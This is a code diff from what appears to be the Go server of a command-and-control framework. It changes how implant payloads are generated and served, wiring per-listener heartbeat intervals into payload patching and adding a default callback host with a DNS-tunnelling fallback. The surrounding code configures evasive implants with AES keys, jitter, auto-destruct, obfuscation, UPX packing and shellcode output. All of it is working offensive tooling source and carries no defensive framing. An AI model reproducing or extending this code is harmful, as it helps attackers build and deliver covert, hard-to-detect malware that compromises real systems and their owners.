@@ -138,7 +138,7 @@ func HandleGenerate(c *gin.Context) {
 			c2url = fmt.Sprintf("ws://%s:%d/ws", host, ln.Port)
 		}
 
-		patched, err := services.PatchPayload(raw, c2url, req.AesKey, 10, req.Jitter, "", req.AutoDestruct, req.SleepTime, req.EncryptionSalt, req.ObfuscationMode)
+		patched, err := services.PatchPayload(raw, c2url, req.AesKey, ln.HeartbeatInterval, req.Jitter, "", req.AutoDestruct, req.SleepTime, req.EncryptionSalt, req.ObfuscationMode)
 		if err != nil {
 			c.JSON(http.StatusInternalServerError, gin.H{"error": "补丁失败: " + err.Error()})
 			return
@@ -157,18 +157,26 @@ func HandleGenerate(c *gin.Context) {
 	// Mode B: Source Build (Asynchronous, supports cross-compilation/custom features)
 	taskID := uuid.New().String()
 
+	host := req.Host
+	if host == "" {
+		host = "127.0.0.1"
+	}
+	if strings.ToUpper(ln.Protocol) == "DNS" {
+		host = ln.NSDomain
+	}
+
 	conf := services.PayloadConfig{
 		OSType:            req.OS,
 		Arch:              req.Arch,
 		Protocol:          ln.Protocol,
-		Host:              req.Host,
+		Host:              host,
 		Port:              fmt.Sprintf("%d", ln.Port),
 		AESKey:            req.AesKey,
 		AsShellcode:       req.AsShellcode,
 		AutoDestruct:      req.AutoDestruct,
 		SleepTime:         req.SleepTime,
 		UseUPX:            req.UseUPX,
-		HeartbeatInterval: 30,
+		HeartbeatInterval: ln.HeartbeatInterval,
 		EncryptionSalt:    req.EncryptionSalt,
 		ObfuscationMode:   req.ObfuscationMode,
 		Jitter:            req.Jitter,
@@ -402,7 +410,7 @@ func HandleServePayload(c *gin.Context) {
 		c2url = fmt.Sprintf("ws://%s:%d/ws", host, ln.Port)
 	}
 
-	patched, err := services.PatchPayload(raw, c2url, ln.EncryptKey, 10, ln.HeartbeatJitter, "", conf.AutoDestruct, conf.SleepTime, ln.EncryptionSalt, ln.ObfuscateMode)
+	patched, err := services.PatchPayload(raw, c2url, ln.EncryptKey, ln.HeartbeatInterval, ln.HeartbeatJitter, "", conf.AutoDestruct, conf.SleepTime, ln.EncryptionSalt, ln.ObfuscateMode)
 	if err != nil {
 		c.Data(500, "text/plain", []byte("Patch failed: " + err.Error()))
 		return
